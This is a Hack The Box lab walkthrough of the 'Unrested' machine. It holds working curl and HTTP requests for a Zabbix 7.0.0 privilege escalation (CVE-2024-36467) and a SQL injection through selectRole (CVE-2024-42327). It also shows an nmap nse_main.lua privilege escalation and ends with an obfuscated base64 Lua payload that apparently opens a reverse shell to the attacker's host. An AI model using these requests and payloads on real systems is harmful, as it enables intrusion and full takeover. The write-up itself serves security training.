---
title: "Exploiting Zabbix SQL injection(CVE-2024-42327 / ZBX-25623) in HTB Unrested"
author: filip
date: 2024-12-10 10:00:00 0000
categories: [Web Security, Hack The Box]
tags: [Notes, Web Security, WhiteBox, CVE, Zabbix, SQL Injection, Privilege escalation, CVE-2024-36467,]
render_with_liquid: false
---

![Unrested](https://labs.hackthebox.com/storage/avatars/81d76cfa411a6a28b524a9283e5e0755.png)

​		Machine Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)


[Completion](https://www.hackthebox.com/achievement/machine/124699/639)


The machine spawns with generated credentials, for me there were:
matthew / `changedpasswd`

Begin with nmap and see that the machine has default web and zabbix agent’s ports opened:

![image.png](assets/img/Unrested/image.png)

When reaching web it declares to have Zabbix 7.0.0 running on it. This version was found to have 2 recently discovered CVEs: app’s privilege escalation and SQL injection, both affecting API endpoints.

![image.png](assets/img/Unrested/image%201.png)

## CVE-2024-36467

The **CVE-2024-36467** declares that it is possible for any user having valid account on zabbix and is allowed to reach API endpoints may change their zabbix role up to “Zabbix administrator” role that is actually a “superuser” for the application defined in the documentation. Just need to have  access to the `user.update` API.

Searching the zabbix API call’s structure, found following:

[https://www.zabbix.com/documentation/current/en/manual/api/reference/user/update](https://www.zabbix.com/documentation/current/en/manual/api/reference/user/update)

that in partucal, interesting request has the following body:

```bash
{
    "jsonrpc": "2.0",
    "method": "user.update",
    "params": {
        "userid": "<your-users-id>",
        "roleid": "<role-id-you-need>"
    },
    "id": 1
}
```

But, before sending this request directly, let’s authenticate to the API. According to the “Authentication” page, we need the following request to be sent initially, grab token, and use it for the authorization:

```bash
Make request:
curl --request POST \
         --url 'https://example.com/zabbix/api_jsonrpc.php' \
         --header 'Content-Type: application/json-rpc' \
         --data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}'
The expected response:
{
    "jsonrpc": "2.0",
    "result": "<token>",
    "id": 1
} 
```

Authorized requests have this token in “Authorization: Bearer <token>” header like following:

```bash
curl --request POST \
  --url 'https://example.com/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 0424bd59b807674191e7d77572075f33'
```

Having this puzzle together we have a successful authentication:

```bash
curl --request POST \
         --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
         --header 'Content-Type: application/json-rpc' \
         --data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"changedpass"},"id":1}'

Response:
{"jsonrpc":"2.0","result":"399d8bffa6f5dafdf18c1c15978a092b","id":1}      
```

Then, I suggested according to the documentation that Zabbix Administrator role is 7 and the group “Internal” is 13 (both give full access for API), and I tried to guess my user’s role, seems it was userid=3:

```bash
curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 399d8bffa6f5dafdf18c1c15978a092b' --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method": "user.update", "params": {"userid": "1", "roleid": "1"}, "id": 1 }' -x http://127.0.0.1:8080

{"jsonrpc":"2.0","error":{"code":-32500,"message":"Application error.","data":"No permissions to referred object or it does not exist!"},"id":1}                                                                                               ... 

curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 399d8bffa6f5dafdf18c1c15978a092b' --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method": "user.update", "params": {"userid": "3", "roleid": "3"}, "id": 1 }' -x http://127.0.0.1:8080

{"jsonrpc":"2.0","error":{"code":-32602,"message":"Invalid params.","data":"User cannot change own role."},"id":1}   
```
It did not work, but in a CUser.php we can find function checkHimself(start at 1109), that is called when we trigger user.update function and see that the next check for `usrgrps` is missing for self-assigning and according to documentation we can leverage this parameter to assign our user multiple groups using usrgrpid [(check)](https://www.zabbix.com/documentation/current/en/manual/api/reference/usergroup/object)

```php
private function checkHimself(array $users) {
		foreach ($users as $user) {
			if (bccomp($user['userid'], self::$userData['userid']) == 0) {
				if (array_key_exists('roleid', $user) && $user['roleid'] != self::$userData['roleid']) {
					self::exception(ZBX_API_ERROR_PARAMETERS, _('User cannot change own role.'));
				}

				if (array_key_exists('usrgrps', $user)) {
					$db_usrgrps = DB::select('usrgrp', [
						'output' => ['gui_access', 'users_status'],
						'usrgrpids' => zbx_objectValues($user['usrgrps'], 'usrgrpid')
					]);
```
so the following request worked as intended:
```bash
curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 129592fc742947f1153cc3db987e85fb' --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method": "user.update", "params": {"userid": "3", "usrgrps": [{"usrgrpid":"7"},{"usrgrpid":"13"}]}, "id": 1 }' -x http://127.0.0.1:8080

{"jsonrpc":"2.0","result":{"userids":["3"]},"id":1} 
```


## CVE-2024-42327 / ZBX-25623

Then we need to exploit SQL injection to get the command execution and land us to the initial foothold on a machine.

<aside>
⚠️

A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.

</aside>

The following code from version 6.0.31 is vulnerable to SQLi :

```php
$db_roles = DBselect(
    'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
    ' FROM users u,role r'.
    ' WHERE u.roleid=r.roleid'.
    ' AND '.dbConditionInt('u.userid', $userIds)
);
```

As we can see it here on line 3046 of function `addRelatedObjects` [https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L2969](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L2969)

that is called in user.get function (defined at line 68, call on line 234)

So the valid legitimate request seems to be like following example:

```bash
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: unrested.htb
User-Agent: curl/7.83.1
Accept: */*
Authorization: Bearer token
Content-Type: application/json-rpc
Content-Length: 221
Connection: close

{"jsonrpc":"2.0"
,
"method":"user.get"
,
"params":{
            "selectRole": ["roleid", "name", "type", "readonly"],
            "userids": ["3"]
        },
"auth":"token"
,
"id":1}
```

where array of `selectRole` is inserted in the select query imploded as a string.

it seems to be like 

```bash
SELECT u.userid, r.roleid, r.name, r.type, r.readonly
FROM users u, role r
WHERE u.roleid = r.roleid
AND u.userid IN …
```

According to how it was implemented in the code, we can suggest the very classic SQL injection:

```bash
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: unrested.htb
User-Agent: curl/7.83.1
Accept: */*
Authorization: Bearer a327c118b37a32cb9fbbe1c80b01f8f9
Content-Type: application/json-rpc
Content-Length: 173
Connection: close

{"jsonrpc":"2.0"
,
"method":"user.get"
,
"params":{
            "selectRole": ["roleid, @@version"],
            "userids": ["1"]
        },
"auth":"a"
,
"id":1}

```

as after tranformation it will look as:

```bash
SELECT u.userid, r.roleid, @@version
FROM users u, role r
WHERE u.roleid = r.roleid
AND u.userid IN …
```

Check response:

![image.png](assets/img/Unrested/image%202.png)

Go further  and confirm nested SQL queries supported:

![image.png](assets/img/Unrested/image%203.png)

and retrieve all tables available since nested SQL queries work and we can do some things manually, but it is important to keep in mind, that this code limits our output to have only 1 row (we need to use LIMIT 1, TOP 1, concatenations, and other methods to get our output as 1 string). 
In this case I gonna use `GROUP_CONCAT` MySQL method:

![image.png](assets/img/Unrested/image%204.png)

Let’s retrieve superuser’s session(at first column names so we know what we call):

![image.png](assets/img/Unrested/image%205.png)

![image.png](assets/img/Unrested/image%206.png)

Great, now we have a valid session of userid=1 that belongs to Zabbix Administrator user(app’s superuser)

Check documentation if we have possibility to create system.run items, zabbix functions that according to documentation lets us run system commands on demand if `EnableRemoteCommands=1` is set:

[https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent#system.run](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent#system.run)

for running so we need also to know the hostid and interfaceid. lets get it and set up a remote shell:

```json
{
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": ["hostid"],
        "selectHostGroups": "extend",
"selectInterfaces":["interfaceid"]
    },
    "id": 1
}
```

![image.png](assets/img/Unrested/image%207.png)

Create RCE confirmation with callback to my web server:

![image.png](assets/img/Unrested/image%208.png)

![image.png](assets/img/Unrested/image%209.png)

Get a reverse shell:

![image.png](assets/img/Unrested/image%2010.png)

Get a user flag from `/home/matthew/`

check `sudo -l` and see that we can run sudo nmap command, but seems nmap is restricted. we cannot run anything available on GTFObins but,  the internet and nmap’s documentation gives us following link [https://nmap.org/book/data-files-replacing-data-files.html](https://nmap.org/book/data-files-replacing-data-files.html) that says that we can replace default data files of nmap, including scripts and main files that are usually in `/usr/share/nmap` or `/usr/local/share/nmap`

The internet says that nse_main.lua is important file, that nmap loads, when executes default scripts. Drop rce `os.execute('touch /dev/shm/rcelol')` into our custom nse_main.lua file:

![image.png](assets/img/Unrested/image%2011.png)

ok, get root  shell and flag. I used `b3MuZXhlY3V0ZSgnZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TUM0eE1DNHhOQzQxTUM4NU1EQXhJREErSmpFPSB8IGJhc2U2NCAtZCB8IGJhc2gnKTs=`:

![image.png](assets/img/Unrested/image%2012.png)